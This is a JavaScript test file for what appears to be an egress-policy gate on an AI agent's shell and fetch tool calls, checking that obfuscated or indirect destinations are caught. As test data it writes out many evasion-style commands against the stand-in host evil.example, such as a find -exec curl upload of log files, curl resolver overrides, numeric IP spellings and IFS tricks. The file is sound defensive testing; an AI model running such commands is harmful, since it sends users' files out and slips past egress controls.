import { test } from 'node:test';
import assert from 'node:assert/strict';
import { decide } from '../src/index.mjs';
import { shellEgressHosts, shellEgressUnresolved } from '../src/classify.mjs';
import { canonicalHost, isExternal } from '../src/scan.mjs';

const P = { egressAllow: ['api.example.com', 'github.com'], writeRoots: ['src/'] };
const sh = (command) => ({ tool: 'shell', input: { command } });
const gated = (action, policy = P) => {
  const v = decide(action, policy);
  assert.equal(v.decision, 'approve', `${JSON.stringify(action.input)} → ${v.decision} (${v.why.join('; ')})`);
};
const allowed = (action, policy = P) => {
  const v = decide(action, policy);
  assert.equal(v.decision, 'allow', `${JSON.stringify(action.input)} → ${v.decision} (${v.why.join('; ')})`);
};

test('canonicalHost gives every spelling of an IPv4 address its dotted form', () => {
  assert.equal(canonicalHost('1249717092'), '74.125.43.100');
  assert.equal(canonicalHost('0x4a7d2b64'), '74.125.43.100');
  assert.equal(canonicalHost('0112.0175.053.0144'), '74.125.43.100');
  assert.equal(canonicalHost('127.1'), '127.0.0.1');
  assert.equal(canonicalHost('evil.example.'), 'evil.example');
  assert.equal(canonicalHost('dario'), 'dario');
});

test('a numeric IPv4 spelling is judged as the address it names', () => {
  assert.equal(isExternal('1249767076'), true);
  assert.equal(isExternal('0x4a7d2b64'), true);
  assert.equal(isExternal('2130706433'), false);   // 127.0.0.1
  assert.equal(isExternal('0xa000001'), false);    // 10.0.0.1
  assert.equal(isExternal('dario'), false);         // a single-label service name stays local
  gated({ tool: 'fetch', input: { url: 'http://1249767076/' } });
  gated({ tool: 'fetch', input: { url: 'http://0x4a7d2b64/' } });
  gated(sh('curl http://1249767076/'));
  gated(sh('wget 0x4a7d2b64/x'));
});

test('a fully qualified name with a trailing dot matches the allowlist the same way', () => {
  assert.equal(isExternal('evil.example.', ['api.example.com']), true);
  assert.equal(isExternal('api.example.com.', ['api.example.com']), false);
  gated(sh('curl evil.example./x'));
  gated(sh('wget -O out evil.example.'));
  allowed(sh('curl https://api.example.com./v1/models'));
});

test('curl flags that override the connection or resolver are checked, not skipped', () => {
  assert.deepEqual(shellEgressUnresolved('curl --connect-to ::evil.example: https://api.example.com'), ['curl --connect-to']);
  gated(sh('curl --connect-to ::evil.example: https://api.example.com'));
  gated(sh('curl --resolve api.example.com:443:203.0.113.9 https://api.example.com'));
  gated(sh('curl --resolve=api.example.com:443:203.0.113.9 https://api.example.com'));
  gated(sh('curl --dns-servers 203.0.113.53 https://api.example.com'));
  gated(sh('curl --doh-url https://doh.evil.example/q https://api.example.com'));
});

test('git remotes in scp form are destinations', () => {
  assert.deepEqual(shellEgressHosts('git clone git@evil.example:a/b.git'), ['evil.example']);
  gated(sh('git clone git@evil.example:a/b.git'));
  gated(sh('git clone evil.example:repo'));
  allowed(sh('git clone git@github.com:askalf/redstamp.git'));
  // A refspec or a Windows drive is not a host.
  assert.deepEqual(shellEgressHosts('git fetch https://github.com/a/b refs/heads/a:refs/heads/b'), ['github.com']);
  assert.deepEqual(shellEgressHosts('git clone C:/src/repo'), []);
});

test('a client started by watch or find -exec is walked like one in command position', () => {
  gated(sh('watch -n 5 curl https://evil.example/x'));
  gated(sh("find . -name '*.log' -exec curl -F f=@{} https://evil.example/in \\;"));
  gated(sh('find . -type f -execdir wget https://evil.example/x \\;'));
  allowed(sh('watch -n 5 curl https://api.example.com/health'));
  allowed(sh("find . -name '*.md' -exec cat {} \\;"));
});

test('download clients read a bare host from a positional, not from a flag value', () => {
  gated(sh('iwr evil.example'));
  gated(sh('aria2c evil.example/x'));
  gated(sh('Invoke-WebRequest -Uri evil.example/x -OutFile out.txt'));
  assert.deepEqual(shellEgressHosts('iwr https://api.example.com/x -OutFile out.txt'), ['api.example.com']);
  allowed(sh('aria2c -o out.tgz https://api.example.com/x.tgz'));
});

// certutil and iwr are also caught by the LOLBin / download-cradle rules, so
// their egress reading is checked directly.
test('a boolean switch before the destination does not hide it', () => {
  gated(sh('iwr -UseBasicParsing evil.example/x'));
  gated(sh('aria2c -c evil.example/x'));
  gated(sh('iwr -UseBasicParsing $u'));
  assert.deepEqual(shellEgressHosts('iwr -UseBasicParsing evil.example/x -OutFile out.txt'), ['evil.example']);
  assert.deepEqual(shellEgressUnresolved('iwr -UseBasicParsing $u'), ['iwr $u']);
  allowed(sh('aria2c -c https://api.example.com/x.tgz'));
});

test('an output file named by a positional is not a destination', () => {
  assert.deepEqual(shellEgressHosts('certutil -urlcache -split -f https://api.example.com/x out.exe'), ['api.example.com']);
  assert.deepEqual(shellEgressHosts('lwp-download https://api.example.com/x out.tgz'), ['api.example.com']);
  allowed(sh('lwp-download https://api.example.com/x out.tgz'));
  gated(sh('lwp-download evil.example/x out.tgz'));
});

test('IFS word splitting is read the way the shell reads it', () => {
  gated(sh('curl${IFS}https://evil.example/x'));
  gated(sh('curl$IFS"https://evil.example/x"'));
});

test('a destination decided at run time cannot be vouched for by the allowlist', () => {
  gated(sh('for u in https://evil.example; do curl $u; done'));
  gated(sh('echo https://evil.example | xargs curl'));
  gated(sh('curl "https://$HOST/x"'));
  gated(sh('git clone "$REPO"'));
  // An assignment from a substitution or another variable is not a literal:
  // the name stays decided at run time.
  gated(sh('u=$(cat h); curl "$u"'));
  gated(sh('u=$H; curl $u'));
  gated(sh('u=`whoami`; curl $u'));
  gated(sh('u=https://api.example.com; u=$EXFIL; curl "$u"'));
  // A literal assignment in the same command is substituted first.
  allowed(sh('u=https://api.example.com/v1; curl "$u"'));
  // A variable in the path leaves the host known.
  allowed(sh('curl "https://api.example.com/v1/$MODEL"'));
  allowed(sh('curl -o "$OUT" https://api.example.com/x'));
  // Without an allowlist nothing here is an egress decision.
  assert.equal(decide(sh('for u in a b; do curl $u; done'), { writeRoots: ['src/'] }).why.some((w) => /allowlist cannot check/.test(w)), false);
});

test('an argv-array command is checked like the same command as a string', () => {
  gated({ tool: 'shell', input: { command: ['curl', 'https://evil.example/x'] } });
  gated({ tool: 'shell', input: { command: ['curl', '--connect-to', '::evil.example:', 'https://api.example.com'] } });
  allowed({ tool: 'shell', input: { command: ['curl', 'https://api.example.com/v1/models'] } });
});
